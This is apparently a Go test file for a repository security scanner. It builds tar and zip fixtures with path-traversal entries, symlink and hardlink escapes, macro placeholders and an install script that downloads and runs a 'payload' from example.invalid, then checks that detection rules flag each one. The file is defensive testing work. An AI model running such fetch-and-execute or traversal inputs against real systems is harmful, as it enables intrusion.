package scan

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
)

func TestArchiveLinkTraversalIsDetected(t *testing.T) {
	t.Run("tar-directory", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := tar.NewWriter(&buf)
		if err := w.WriteHeader(&tar.Header{Name: "../outside/", Typeflag: tar.TypeDir}); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, "archive.tar"), buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("tar directory traversal missed: %+v", findings)
		}
	})
	t.Run("tar-symlink", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := tar.NewWriter(&buf)
		if err := w.WriteHeader(&tar.Header{Name: "link", Typeflag: tar.TypeSymlink, Linkname: "../outside"}); err != nil {
			t.Fatal(err)
		}
		body := []byte("payload")
		if err := w.WriteHeader(&tar.Header{Name: "link/payload.txt", Mode: 0o644, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write(body); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, "archive.tar"), buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("tar symlink traversal missed: %+v", findings)
		}
	})
	t.Run("tar-hardlink", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := tar.NewWriter(&buf)
		if err := w.WriteHeader(&tar.Header{Name: "outside", Typeflag: tar.TypeLink, Linkname: "../outside"}); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, "archive.tar"), buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("tar hardlink traversal missed: %+v", findings)
		}
	})
	t.Run("zip-symlink", func(t *testing.T) {
		repo := t.TempDir()
		var buf bytes.Buffer
		w := zip.NewWriter(&buf)
		h := &zip.FileHeader{Name: "link"}
		h.SetMode(os.ModeSymlink | 0o777)
		entry, err := w.CreateHeader(h)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write([]byte("../outside")); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(repo, "archive.zip"), buf.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		_, findings := New(Options{}).Scan(context.Background(), repo)
		if !hasRule(findings, "ARCHIVE-001") {
			t.Fatalf("zip symlink traversal missed: %+v", findings)
		}
	})
}

func TestArchivePathsStayWithinExtractionRoot(t *testing.T) {
	for _, tc := range []struct {
		path   string
		unsafe bool
	}{
		{"../../escape.sh", true},
		{"dir/../../escape.sh", true},
		{`..\..\escape.sh`, true},
		{"/absolute.sh", true},
		{`C:\escape.sh`, true},
		{"..fixture/file.sh", false},
		{"dir/../file.sh", false},
		{"normal/file.sh", false},
	} {
		t.Run(tc.path, func(t *testing.T) {
			root := t.TempDir()
			var archive bytes.Buffer
			writer := zip.NewWriter(&archive)
			entry, err := writer.Create(tc.path)
			if err != nil {
				t.Fatal(err)
			}
			if _, err := entry.Write([]byte("echo harmless fixture")); err != nil {
				t.Fatal(err)
			}
			if err := writer.Close(); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(root, "fixture.zip"), archive.Bytes(), 0o644); err != nil {
				t.Fatal(err)
			}
			coverage, findings := New(Options{}).Scan(context.Background(), root)
			if got := hasRule(findings, "ARCHIVE-001"); got != tc.unsafe || coverage.Complete == tc.unsafe {
				t.Fatalf("path %q: traversal finding=%v, coverage complete=%v, want unsafe=%v: %+v", tc.path, got, coverage.Complete, tc.unsafe, findings)
			}
		})
	}
}

func TestArchiveEntriesUseInnerPathContextAndLocations(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	var archive bytes.Buffer
	writer := zip.NewWriter(&archive)
	entry, err := writer.Create("src/runtime.js")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := entry.Write([]byte("spawn('node', args);\n")); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "outer-fixture.zip"), archive.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "EXEC-002")
	if !ok || finding.Context != "executable" || finding.Path != "outer-fixture.zip!src/runtime.js" || len(finding.Locations) != 1 || finding.Locations[0].StartLine != 1 {
		t.Fatalf("archive entry used its outer path context: %+v", finding)
	}
}

func TestStructuredDetectorsInspectRootEntriesInsideArchives(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	var archive bytes.Buffer
	writer := zip.NewWriter(&archive)
	entries := map[string]string{
		"package.json":                 `{"scripts":{"postinstall":"echo reviewed"},"dependencies":{"tailwind-form-kit":"1.0.0"}}`,
		".github/workflows/verify.yml": "steps:\n  - uses: actions/checkout@v4\n",
	}
	for name, body := range entries {
		entry, err := writer.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bundle.zip"), archive.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"PKG-001", "IOC-PKG-GHSA-p7c5-phj5-qm49", "CICD-003"} {
		finding, ok := ruleFinding(findings, id)
		if !ok || !strings.HasPrefix(finding.Path, "bundle.zip!") || finding.Line < 1 {
			t.Errorf("structured archive rule %s missing exact inner location: %+v", id, finding)
		}
	}
}

func TestArchivedExecutableExtensionlessStagedExecutionIsDetected(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	var buffer bytes.Buffer
	writer := zip.NewWriter(&buffer)
	header := &zip.FileHeader{Name: "install", Method: zip.Deflate}
	header.SetMode(0o755)
	entry, err := writer.CreateHeader(header)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := entry.Write([]byte("curl -o payload https://example.invalid/tool\n./payload\n")); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bundle.zip"), buffer.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "CHAIN-004") {
		t.Fatalf("archived executable extensionless script was missed: %+v", findings)
	}
}

func TestNestedArchiveFindingKeepsOuterFixtureContext(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	if err := os.MkdirAll(filepath.Join(root, "testdata"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeZIPFixture(t, filepath.Join(root, "testdata"), "sample.docm", map[string]string{
		"word/vbaProject.bin": "fixture macro bytes",
	})
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "DOC-002")
	if !ok || finding.Context != "test-fixture" || finding.Severity != model.SeverityMedium || finding.Confidence != model.ConfidenceLow || finding.Disposition != model.DispositionInformational {
		t.Fatalf("outer archive fixture context was lost: %+v", findings)
	}
}

func TestNestedDocumentAndVSIXActiveContent(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")

	makeArchive := func(name, body string) []byte {
		var buffer bytes.Buffer
		writer := zip.NewWriter(&buffer)
		entry, err := writer.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
		if err := writer.Close(); err != nil {
			t.Fatal(err)
		}
		return buffer.Bytes()
	}
	office := makeArchive("word/vbaProject.bin", "fixture macro bytes")
	vsix := makeArchive("extension/package.json", `{"activationEvents":["onStartupFinished"]}`)

	var outer bytes.Buffer
	outerWriter := zip.NewWriter(&outer)
	for name, body := range map[string][]byte{"brief.docm": office, "extension.vsix": vsix} {
		entry, err := outerWriter.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write(body); err != nil {
			t.Fatal(err)
		}
	}
	if err := outerWriter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bundle.zip"), outer.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}

	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"DOC-002", "IDE-008"} {
		if !hasRule(findings, id) {
			t.Errorf("missing nested %s: %+v", id, findings)
		}
	}
}
